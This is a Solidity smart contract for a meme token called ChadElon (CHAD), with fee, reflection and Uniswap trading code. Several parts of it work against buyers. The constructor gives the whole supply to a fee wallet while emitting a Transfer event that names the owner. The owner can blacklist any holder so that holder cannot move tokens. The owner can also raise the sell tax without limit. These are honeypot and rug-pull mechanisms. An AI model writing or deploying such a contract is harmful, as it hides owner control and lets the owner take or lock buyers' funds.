1 // Name: ChadElon 
2 // Symbol: CHAD 
3 // Total Supply: 1 Trillion (1000000000000)
4 // Telegram: https://t.me/ChadElon
5 // Website: https://chadelon.com/
6 // SPDX-License-Identifier: Unlicensed
7 
8 pragma solidity ^0.8.4;
9 
10 abstract contract Context {
11     function _msgSender() internal view virtual returns (address) {
12         return msg.sender;
13     }
14 }
15 
16 interface IERC20 {
17     function totalSupply() external view returns (uint256);
18     function balanceOf(address account) external view returns (uint256);
19     function transfer(address recipient, uint256 amount) external returns (bool);
20     function allowance(address owner, address spender) external view returns (uint256);
21     function approve(address spender, uint256 amount) external returns (bool);
22     function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
23     event Transfer(address indexed from, address indexed to, uint256 value);
24     event Approval(address indexed owner, address indexed spender, uint256 value);
25 }
26 
27 library SafeMath {
28     function add(uint256 a, uint256 b) internal pure returns (uint256) {
29         uint256 c = a + b;
30         require(c >= a, "SafeMath: addition overflow");
31         return c;
32     }
33 
34     function sub(uint256 a, uint256 b) internal pure returns (uint256) {
35         return sub(a, b, "SafeMath: subtraction overflow");
36     }
37 
38     function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
39         require(b <= a, errorMessage);
40         uint256 c = a - b;
41         return c;
42     }
43 
44     function mul(uint256 a, uint256 b) internal pure returns (uint256) {
45         if (a == 0) {
46             return 0;
47         }
48         uint256 c = a * b;
49         require(c / a == b, "SafeMath: multiplication overflow");
50         return c;
51     }
52 
53     function div(uint256 a, uint256 b) internal pure returns (uint256) {
54         return div(a, b, "SafeMath: division by zero");
55     }
56 
57     function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
58         require(b > 0, errorMessage);
59         uint256 c = a / b;
60         return c;
61     }
62 
63 }
64 
65 contract Ownable is Context {
66     address private _owner;
67     address private _previousOwner;
68     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
69 
70     constructor () {
71         address msgSender = _msgSender();
72         _owner = msgSender;
73         emit OwnershipTransferred(address(0), msgSender);
74     }
75 
76     function owner() public view returns (address) {
77         return _owner;
78     }
79 
80     modifier onlyOwner() {
81         require(_owner == _msgSender(), "Ownable: caller is not the owner");
82         _;
83     }
84 
85     function renounceOwnership() public virtual onlyOwner {
86         emit OwnershipTransferred(_owner, address(0));
87         _owner = address(0);
88     }
89 
90 }  
91 
92 interface IUniswapV2Factory {
93     function createPair(address tokenA, address tokenB) external returns (address pair);
94 }
95 
96 interface IUniswapV2Router02 {
97     function swapExactTokensForETHSupportingFeeOnTransferTokens(
98         uint amountIn,
99         uint amountOutMin,
100         address[] calldata path,
101         address to,
102         uint deadline
103     ) external;
104     function factory() external pure returns (address);
105     function WETH() external pure returns (address);
106     function addLiquidityETH(
107         address token,
108         uint amountTokenDesired,
109         uint amountTokenMin,
110         uint amountETHMin,
111         address to,
112         uint deadline
113     ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
114 }
115 
116 contract ChadElon is Context, IERC20, Ownable {
117     using SafeMath for uint256;
118     mapping (address => uint256) private _rOwned;
119     mapping (address => uint256) private _tOwned;
120     mapping (address => mapping (address => uint256)) private _allowances;
121     mapping (address => bool) private _isExcludedFromFee;
122     mapping (address => bool) private bots;
123     mapping (address => uint) private cooldown;
124     uint256 private constant MAX = ~uint256(0);
125     uint256 private constant _tTotal = 1000000000000 * 10**9;
126     uint256 private _rTotal = (MAX - (MAX % _tTotal));
127     uint256 private _tFeeTotal;
128     uint256 private _redis = 1;
129     uint256 private _tax = 10;
130     uint256 private _selltax = 25;
131     uint256 private _feeAddr1;
132     uint256 private _feeAddr2;
133     address payable private _feeAddrWallet1;
134     address payable private _feeAddrWallet2;
135     
136     string private constant _name = "ChadElon";
137     string private constant _symbol = "CHAD";
138     uint8 private constant _decimals = 9;
139     
140     IUniswapV2Router02 private uniswapV2Router;
141     address private uniswapV2Pair;
142     bool private tradingOpen;
143     bool private inSwap = false;
144     bool private swapEnabled = false;
145     bool private cooldownEnabled = false;
146     uint256 private _maxTxAmount = _tTotal;
147     event MaxTxAmountUpdated(uint _maxTxAmount);
148     modifier lockTheSwap {
149         inSwap = true;
150         _;
151         inSwap = false;
152     }
153     constructor (address payable _add1,address payable _add2) {
154         _feeAddrWallet1 = _add1;
155         _feeAddrWallet2 = _add2;
156         _rOwned[_feeAddrWallet1] = _rTotal;
157         _isExcludedFromFee[owner()] = true;
158         _isExcludedFromFee[address(this)] = true;
159         _isExcludedFromFee[_feeAddrWallet1] = true;
160         emit Transfer(address(0),owner(), _tTotal);
161     }
162 
163     function name() public pure returns (string memory) {
164         return _name;
165     }
166 
167     function symbol() public pure returns (string memory) {
168         return _symbol;
169     }
170 
171     function decimals() public pure returns (uint8) {
172         return _decimals;
173     }
174 
175     function totalSupply() public pure override returns (uint256) {
176         return _tTotal;
177     }
178 
179     function balanceOf(address account) public view override returns (uint256) {
180         return tokenFromReflection(_rOwned[account]);
181     }
182 
183     function transfer(address recipient, uint256 amount) public override returns (bool) {
184         _transfer(_msgSender(), recipient, amount);
185         return true;
186     }
187 
188     function allowance(address owner, address spender) public view override returns (uint256) {
189         return _allowances[owner][spender];
190     }
191 
192     function approve(address spender, uint256 amount) public override returns (bool) {
193         _approve(_msgSender(), spender, amount);
194         return true;
195     }
196 
197     function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
198         _transfer(sender, recipient, amount);
199         _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
200         return true;
201     }
202 
203     function setCooldownEnabled(bool onoff) external onlyOwner() {
204         cooldownEnabled = onoff;
205     }
206 
207     function tokenFromReflection(uint256 rAmount) private view returns(uint256) {
208         require(rAmount <= _rTotal, "Amount must be less than total reflections");
209         uint256 currentRate =  _getRate();
210         return rAmount.div(currentRate);
211     }
212 
213     function _approve(address owner, address spender, uint256 amount) private {
214         require(owner != address(0), "ERC20: approve from the zero address");
215         require(spender != address(0), "ERC20: approve to the zero address");
216         _allowances[owner][spender] = amount;
217         emit Approval(owner, spender, amount);
218     }
219 
220     function _transfer(address from, address to, uint256 amount) private {
221         require(amount > 0, "Transfer amount must be greater than zero");
222         require(!bots[from]);
223         if (from != address(this)) {
224             _feeAddr1 = _redis;
225             _feeAddr2 = _tax;
226             if(to == uniswapV2Pair){
227                 _feeAddr2 = _selltax;
228             }
229             uint256 contractTokenBalance = balanceOf(address(this));
230             if (!inSwap && from != uniswapV2Pair && swapEnabled) {
231                 if(contractTokenBalance > _tTotal/1000){
232                 swapTokensForEth(contractTokenBalance);
233                 }
234                 uint256 contractETHBalance = address(this).balance;
235                 if(contractETHBalance > 200000000000000000) {
236                     sendETHToFee(address(this).balance);
237                 }
238             }
239         }
240         if( from == owner()){
241             _feeAddr2 = 0;
242             _feeAddr1 = 0;
243         }
244         _tokenTransfer(from,to,amount);
245     }
246 
247     function reduceSaleTax(uint256 _reducedTax) external onlyOwner{
248         _selltax = _reducedTax;
249     }
250 
251     function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
252         address[] memory path = new address[](2);
253         path[0] = address(this);
254         path[1] = uniswapV2Router.WETH();
255         _approve(address(this), address(uniswapV2Router), tokenAmount);
256         uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
257             tokenAmount,
258             0,
259             path,
260             address(this),
261             block.timestamp
262         );
263     }
264 
265     function sendETHToFee(uint256 amount) private {
266         uint256 diff = amount - amount/10;
267         _feeAddrWallet1.transfer(amount/10);
268         _feeAddrWallet2.transfer(diff);
269     }
270     
271     function openTrading() external onlyOwner() {
272         require(!tradingOpen,"trading is already open");
273         IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
274         uniswapV2Router = _uniswapV2Router;
275         _approve(address(this), address(uniswapV2Router), _tTotal);
276         uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH());
277         uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
278         swapEnabled = true;
279         cooldownEnabled = true;
280         _maxTxAmount = _tTotal;
281         tradingOpen = true;
282         IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);
283     }
284     
285     function blacklistBot(address _address) external onlyOwner(){
286             bots[_address] = true;
287     }
288     
289     function removeFromBlacklist(address notbot) external onlyOwner(){
290         bots[notbot] = false;
291     }
292         
293     function _tokenTransfer(address sender, address recipient, uint256 amount) private {
294         _transferStandard(sender, recipient, amount);
295     }
296 
297     function _transferStandard(address sender, address recipient, uint256 tAmount) private {
298         (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee, uint256 tTeam) = _getValues(tAmount);
299         _rOwned[sender] = _rOwned[sender].sub(rAmount);
300         _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount); 
301         _takeTeam(tTeam);
302         _reflectFee(rFee, tFee);
303         emit Transfer(sender, recipient, tTransferAmount);
304     }
305 
306 
307     function _takeTeam(uint256 tTeam) private {
308         uint256 currentRate =  _getRate();
309         uint256 rTeam = tTeam.mul(currentRate);
310         _rOwned[address(this)] = _rOwned[address(this)].add(rTeam);
311     }
312 
313     function _reflectFee(uint256 rFee, uint256 tFee) private {
314         _rTotal = _rTotal.sub(rFee);
315         _tFeeTotal = _tFeeTotal.add(tFee);
316     }
317 
318     receive() external payable {}
319     
320     function manualswap() external {
321         require(_msgSender() == _feeAddrWallet1);
322         uint256 contractBalance = balanceOf(address(this));
323         swapTokensForEth(contractBalance);
324     }
325     
326     function manualsend() external {
327         require(_msgSender() == _feeAddrWallet1);
328         uint256 contractETHBalance = address(this).balance;
329         sendETHToFee(contractETHBalance);
330     }
331     
332 
333     function _getValues(uint256 tAmount) private view returns (uint256, uint256, uint256, uint256, uint256, uint256) {
334         (uint256 tTransferAmount, uint256 tFee, uint256 tTeam) = _getTValues(tAmount, _feeAddr1, _feeAddr2);
335         uint256 currentRate =  _getRate();
336         (uint256 rAmount, uint256 rTransferAmount, uint256 rFee) = _getRValues(tAmount, tFee, tTeam, currentRate);
337         return (rAmount, rTransferAmount, rFee, tTransferAmount, tFee, tTeam);
338     }
339 
340     function _getTValues(uint256 tAmount, uint256 taxFee, uint256 TeamFee) private pure returns (uint256, uint256, uint256) {
341         uint256 tFee = tAmount.mul(taxFee).div(100);
342         uint256 tTeam = tAmount.mul(TeamFee).div(100);
343         uint256 tTransferAmount = tAmount.sub(tFee).sub(tTeam);
344         return (tTransferAmount, tFee, tTeam);
345     }
346 
347     function _getRValues(uint256 tAmount, uint256 tFee, uint256 tTeam, uint256 currentRate) private pure returns (uint256, uint256, uint256) {
348         uint256 rAmount = tAmount.mul(currentRate);
349         uint256 rFee = tFee.mul(currentRate);
350         uint256 rTeam = tTeam.mul(currentRate);
351         uint256 rTransferAmount = rAmount.sub(rFee).sub(rTeam);
352         return (rAmount, rTransferAmount, rFee);
353     }
354 
355 	function _getRate() private view returns(uint256) {
356         (uint256 rSupply, uint256 tSupply) = _getCurrentSupply();
357         return rSupply.div(tSupply);
358     }
359 
360     function _getCurrentSupply() private view returns(uint256, uint256) {
361         uint256 rSupply = _rTotal;
362         uint256 tSupply = _tTotal;      
363         if (rSupply < _rTotal.div(_tTotal)) return (_rTotal, _tTotal);
364         return (rSupply, tSupply);
365     }
366 }